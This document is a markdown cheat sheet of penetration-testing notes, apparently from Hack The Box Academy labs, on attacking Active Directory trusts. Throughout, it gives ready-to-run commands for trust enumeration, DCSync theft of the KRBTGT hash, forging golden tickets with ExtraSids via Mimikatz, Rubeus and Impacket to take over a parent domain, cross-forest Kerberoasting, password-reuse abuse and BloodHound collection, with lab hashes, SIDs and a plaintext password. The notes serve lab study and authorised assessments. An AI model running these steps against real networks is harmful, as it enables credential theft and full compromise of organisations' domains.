# 📖 Enumerating Trusts Relationships
```bash
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

# Enumerate Trust Relationships w/ PowerView.ps1
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainTrust

# Retrieve the type of trust (parent/child, external, forest...) w/ PowerView.ps1
PS C:\htb> Get-DomainTrustMapping

# Checking Users in the Child Domain w/ PowerView.ps1
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

# Query domain trust using cmd.exe
C:\htb> netdom query /domain:inlanefreight.local trust
# Query domain controllers
C:\htb> netdom query /domain:inlanefreight.local dc
# Query domain workstations & servers
C:\htb> netdom query /domain:inlanefreight.local workstation

# Or use BloodHound
```



# 👨‍👩‍👦 Child → Parent Trusts - from Windows
- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice versa. This attack is also known as ``Golden Ticket``
## ExtraSids Attack w/ Mimikatz
[This attack](https://academy.hackthebox.com/module/143/section/1457) allows for the compromise of a parent domain once the child domain has been compromised. To perform this attack after compromising a child domain, we need :
- The KRBTGT hash for the child domain → ``9d765b482771505cbe97411065964d5f``
- The SID for the child domain → ``S-1-5-21-2806153819-209893948-922872689``
- The name of a target user in the child domain (does not need to exist!) → we'll choose a fake user: `hacker`
- The FQDN of the child domain → ``LOGISTICS.INLANEFREIGHT.LOCAL``
- The SID of the Enterprise Admins group of the root domain → ``S-1-5-21-3842939050-3880317879-2865463114-519``
```bash
# Obtaining the KRBTGT Account's NT Hash 
mimikatz > lsadump::dcsync /user:LOGISTICS\krbtgt

# Get SID for the child domain w/ PowerView.ps1 (also visible in the previous mimikatz output)
PS C:\htb> Get-DomainSID

# Get the SID for the Enterprise Admins group in the parent domain w/ PowerView.ps1
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# Get the SID for the Enterprise Admins group in the parent domain w/ cmdlet
C:\htb> Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"

# Gathering all data listed above, we can create a Golden Ticket to access all resources in parent domain
mimikatz > kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify that the Golden Ticket for fake user "hacker" is in memory
PS C:\htb> klist

# List & access the entire C:\ drive of DC
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
## ExtraSids Attack w/ Rubeus
We'll need the same data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket, giving us the same rights as members of the Enterprise Admins group in the parent domain.
```bash
# Create Golden Ticket w/ Rubeus
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# Verify that the Golden Ticket for fake user "hacker" is in memory
PS C:\htb> klist

# We can test access performing a DCSync against parent domain, targeting the "lab_adm" Domain Admin user
mimikatz > lsadump::dcsync /user:INLANEFREIGHT\lab_adm

# When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller
mimikatz > lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```



# 👨‍👩‍👦 Child → Parent Trusts - from Linux
We'll need the exact same previous information to reproduce [the attack](https://academy.hackthebox.com/module/143/section/1508), and have complete control of the child domain `LOGISTICS.INLANEFREIGHT.LOCAL`.
```bash
# Perform DCSync & grab the NTLM Hash of the KRBTGT account
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# SID bruteforcing to find child's domain SID. The output will give SID for the domain & RIDs for each user & group. We could input whatever IP address that exist
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
# Filter to get only the SID of the domain
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# Rerun targeting the DC IP & grab the domain SID + attach the RID of the "Enterprise Admins" group
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# We now have gathered the following info : 
# - The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
# - The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
# - The name of a target user in the child domain (does not need to exist!): hacker
# - The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
# - The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

# Construct a Golden Ticket, that will be saved in a ccache file
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Setting KRB5CCNAME Environment Variable
export KRB5CCNAME=hacker.ccache

# Authenticate to parent domain's DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
## Automate process w/ raiseChild.py
[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. He will gather for us all the needed data ! 
```bash
# Performing attack w/ raiseChild.py
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```



# 🌲 Cross-Forest Trusts - from Windows
## Cross-Forest Kerberoasting
Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has ``Domain/Enterprise Admin privileges`` in both domains.
```bash
# Enumerate accounts for associated SPNs w/ PowerView.ps1
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Confirm the found user is member of the Domain Admins group in target domain
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Perform Kerberoasting w/ Rubeus including the /domain: flag and specify the target domain
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
## Admin Password Re-Use & Group Membership
From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named `adm_bob.smith` in the Domain Admins group, and Domain B had a user named `bsmith_admin`. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.

We may also see users or admins from Domain A as members of a group in Domain B. Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
```bash
# Enumerate groups with users that do not belong to the domain, using a foreign domain we have a bidirectional trust with
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
<SNIP>
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500

# Retrieve the name of the account
PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
INLANEFREIGHT\administrator

# Here, the built-in Administrators group in "FREIGHTLOGISTICS.LOCAL" has the built-in Administrator account for the "INLANEFREIGHT.LOCAL" domain as a member. We can verify this access using the "Enter-PSSession" cmdlet to connect over WinRM
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```



# 🌲 Cross-Forest Trusts - from Linux
## Cross-Forest Kerberoasting
```bash
# List accounts w/ SPNs set. The account we use must be able to authenticate to the other domain
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Retrieve the TGS ticket. Can be cracked w/ hashcat mode 13100
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# If this attack works during a real-world assessment, it would be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.

# Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains.
```
## Hunting Foreing Group Membership w/ BloodHound
Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.
```bash
# On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our "resolv.conf" file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address.

# Adding domain info to /etc/resolv.conf
cat /etc/resolv.conf 
<SNIP>
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

# Run BloodHound against domain A (INLANEFREIGHT.LOCAL)
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
zip -r ilfreight_bh.zip *.json

# Then we'll repeat the same edit of resolv.conf w/ the details of the foreign (other) domain we have trust with
cat /etc/resolv.conf 
<SNIP>
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

# Re run BloodHound against domain B (FREIGHTLOGISTICS.LOCAL)
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
zip -r ilfreight_logistic_bh.zip *.json

# Then, upload both the .zip archive to BloodHound & click on "Users with Foreign Domain Group Membership" under the "Analysis" tab and select the source domain as "INLANEFREIGHT.LOCAL".
```
